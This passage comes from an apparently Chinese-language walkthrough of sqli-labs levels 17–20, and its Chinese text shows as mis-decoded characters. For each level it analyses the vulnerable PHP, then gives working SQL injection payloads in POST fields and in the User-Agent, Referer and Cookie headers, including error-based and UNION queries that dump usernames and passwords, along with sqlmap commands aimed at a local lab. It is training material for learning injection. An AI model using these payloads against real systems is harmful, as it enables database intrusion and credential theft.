align="left"><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># uname å‚æ•°è¢«è¿‡æ»¤äº†</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># SELECT è¯­å¥åªè·å–äº† uname å‚æ•° ä½†æ˜¯è¢«è¿‡æ»¤äº† æ²¡æˆ</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> select ç»“æœæ­£ç¡®<span class="token punctuation">:</span>    <span class="token comment"># æ›´æ–°è¯­å¥ ä½¿ç”¨å•å¼•å·æ‹¼æ¥ passwd</span>    <span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> mysql æŠ¥é”™<span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»æºç ä¸­å¯ä»¥åˆ†äº«å”¯ä¸€çš„æ³¨å…¥ç‚¹æ˜¯åœ¨ update è¯­å¥é‡Œé¢ï¼Œåªä½¿ç”¨äº†å•å¼•å·æ‹¼æ¥ã€‚å› ä¸ºæ“ä½œæ­£ç¡®å¹¶æ²¡æœ‰å•¥æç¤ºï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå› ä¸ºè¾“å‡ºäº†æŠ¥é”™æ—¥å¿—ï¼Œæ‰€ä»¥è¿˜å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œé‚£ä¹ˆä¸‹é¢å°±æ¼”ç¤ºä¸€ä¸‹æŠ¥é”™æ³¨å…¥å§ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span>' AND <span class="token punctuation">(</span>SELECT <span class="token number">1</span> FROM <span class="token punctuation">(</span>SELECT COUNT<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,CONCAT<span class="token variable"><span class="token punctuation">((</span>SELECT<span class="token punctuation">(</span>SELECT CONCAT<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> AS CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">))</span></span> FROM <span class="token function">users</span> LIMIT <span class="token number">0,1</span><span class="token punctuation">)</span>,FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x FROM INFORMATION_SCHEMA.TABLES GROUP BY x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è·å–è¯·æ±‚çš„ uagent å’Œ ip åœ°å€</span><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> è¾“å…¥äº†uname å’Œ passwd<span class="token punctuation">:</span>    <span class="token comment"># å¯¹è¿™ä¸¤ä¸ªå‚æ•°è¿›è¡Œè¿‡æ»¤</span>    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token constant">SQL</span>è¯­å¥æœ‰è¿”å›ç»“æœ<span class="token punctuation">:</span>        <span class="token comment"># æ‰§è¡Œ insert è¯­å¥ è¿™é‡Œ uagent å’Œ ip_address é€šè¿‡å•å¼•å·æ‹¼æ¥ å¹¶ä¸” æ²¡æœ‰è¿‡æ»¤</span>        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span>            è¾“å‡º <span class="token variable">$uagent</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªä»£ç æ¼æ´ç‚¹å‡ºåœ¨äº† insert è¯­å¥ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹ uagent å’Œ ip_address è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”è¾“å‡ºäº† mysql çš„æŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥æœ¬å…³æ”¯æŒ æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨ã€‚</p><p><strong>PHP é‡Œç”¨æ¥è·å–å®¢æˆ·ç«¯ IP çš„å˜é‡</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> è¿™ä¸ªå¾ˆå°‘ä½¿ç”¨ï¼Œä¸ä¸€å®šæœåŠ¡å™¨éƒ½å®ç°äº†ã€‚å®¢æˆ·ç«¯å¯ä»¥ä¼ªé€ ã€‚</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä¼ªé€ ã€‚</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>ï¼Œå®¢æˆ·ç«¯ä¸èƒ½ä¼ªé€ ã€‚</li></ul><p>æ‰€ä»¥è¿™é‡Œçš„ IP æ˜¯æ— æ³•è¢«ä¼ªé€ çš„ï¼Œè¿™é‡Œåªèƒ½é€šè¿‡ä¿®æ”¹ user-agent æ¥è¿›è¡Œæ³¨å…¥ï¼Œè€ƒè™‘åˆ° insert è¯­å¥çš„ç‰¹æ®Šæ€§ï¼Œè¿™é‡Œä½¿ç”¨é—­åˆæ–¹å¼æ¥é—­åˆæ‰åé¢çš„è¯­å¥ï¼Œå› ä¸ºè¾“å‡ºäº† mysql æŠ¥é”™æ—¥å¿—äº†ï¼Œè¿™é‡Œå°è¯•æŠ¥é”™æ³¨å…¥æ•ˆç‡ä¼šæ›´é«˜ä¸€ç‚¹ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-18/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-18/</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200513/15893833852620.png" alt="img"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># è·å–è¯·æ±‚çš„ referer å’Œ ip åœ°å€</span><span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> è¾“å…¥äº†uname å’Œ passwd<span class="token punctuation">:</span>    <span class="token comment"># uname å’Œ passwd å‚æ•°å‡è¢«è¿‡æ»¤</span>    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token constant">SQL</span>è¯­å¥æœ‰è¿”å›ç»“æœ<span class="token punctuation">:</span>        <span class="token comment"># å•å¼•å·æ‹¼æ¥åç›´æ¥å¸¦å…¥ insert è¯­å¥</span>        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>')"</span><span class="token punctuation">;</span>        è¾“å‡º <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬å…³å’Œ Less-18 å¼‚æ›²åŒå·¥ï¼Œåªæ˜¯è¿™é‡Œçš„æ¼æ´ç‚¹å‡ºåœ¨äº† referer é‡Œé¢ï¼Œå…¶ä»–åˆ©ç”¨æ–¹å¼åŸºæœ¬ä¸Šä¹Ÿæ˜¯ä¸€æ¯›ä¸€æ ·ï¼Œæ‰€ä»¥ä¸‹é¢ç›´æ¥ä¸Š payload æ¼”ç¤ºå§ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-19/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894186942757.png" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>ç®€å•æºç åˆ†æ</strong>:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> cookie ä¸­ä¸å­˜åœ¨ uname å‚æ•°<span class="token punctuation">:</span>      è¾“å‡ºäº†ä¸€å †æ— ç”¨çš„ä¿¡æ¯    <span class="token keyword">if</span> æäº¤äº† uname å’Œ passwd<span class="token punctuation">:</span>        <span class="token comment"># è¿›è¡Œè¿‡æ»¤</span>        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> æœ‰æŸ¥è¯¢ç»“æœ<span class="token punctuation">:</span>            <span class="token comment"># å°† uname çš„å€¼è®¾ç½®ç»™ cookie é‡Œé¢çš„ uname å‚æ•°</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token constant">POST</span> æ•°æ®é‡Œé¢æ²¡æœ‰ submit å‚æ•°<span class="token punctuation">:</span>        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment"># ç›´æ¥å°† cookee é€šè¿‡å•å¼•å·æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­</span>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> æŸ¥è¯¢æ— ç»“æœ<span class="token punctuation">:</span>            è¾“å‡º <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> æœ‰ç»“æœ<span class="token punctuation">:</span>            è¾“å‡ºæŸ¥è¯¢çš„ä¿¡æ¯    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å°† uname çš„å€¼è®¾ç½®ç»™ cookie é‡Œé¢çš„ uname å‚æ•°</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»æºç ä¸­å¯ä»¥åˆ†æå‡º Less-20 è¦å¤æ‚ä¸€ç‚¹ï¼Œä¸è¿‡é—®é¢˜è¿˜æ˜¯å­˜åœ¨ï¼Œä» cookie ä¸­è¯»å–çš„ uname å‚æ•°å€¼ å¹¶ç›´æ¥æ‹¼æ¥åˆ°äº† SQL è¯­å¥ä¸­äº†ï¼Œè¿™å°±å¯¼è‡´äº†æ³¨å…¥ç‚¹çš„äº§ç”Ÿï¼Œå¹¶ä¸”è¿˜è¾“å‡ºäº†æŸ¥è¯¢ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè”åˆæŸ¥è¯¢æ³¨å…¥çš„ã€‚å› ä¸ºæ˜¯åŸºç¡€å…³å¡çš„æœ€åä¸€å…³ï¼Œæ‰€ä»¥è¿™é‡Œ è€æ¯›ç—…åˆçŠ¯äº†ï¼Œè¿™é‡Œå°±å†å•°å—¦ä¸€ä¸‹ï¼š</p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥-2"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥-2" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894228024343.png" alt="img"></p><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://image.3001.net/images/20200514/15894229147799.png" alt="img"></p><h3 id="ç›²æ³¨-1"><a href="#ç›²æ³¨-1" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>å¸ƒå°”ç›²æ³¨å’Œå»¶æ—¶ç›²æ³¨ä¹Ÿæ˜¯ OK çš„ï¼Œä½†æ˜¯å®é™…ä¸Šæ‰‹å·¥æ³¨å…¥çš„æ•ˆç‡å¹¶ä¸å¦‚è”åˆä¸æŠ¥é”™æ³¨å…¥ï¼Œæ‰€ä»¥ è¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ï¼Œä¸‹é¢ç›´æ¥æ¼”ç¤º sqlmap çš„æ³¨å…¥è¿‡ç¨‹å§ï¼š</p><h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>è”åˆæŸ¥è¯¢æ³¨å…¥</strong></p><p>å¦‚æœ <code>--level</code> è®¾ç½®ä¸º <strong>2</strong> æˆ–æ›´é«˜ï¼Œåˆ™ sqlmap ä¼šå¯¹ HTTP <code>Cookie</code> è¯·æ±‚å¤´è¿›è¡Œ SQL æ³¨å…¥æµ‹è¯•:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ç„¶æ‰‹åŠ¨é€šè¿‡<code>*</code>æ¥æ ‡è®°æ³¨å…¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼š<code>--cookie=&quot;uname=admin*&quot;</code></p><p>**æŠ¥é”™æ³¨å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token 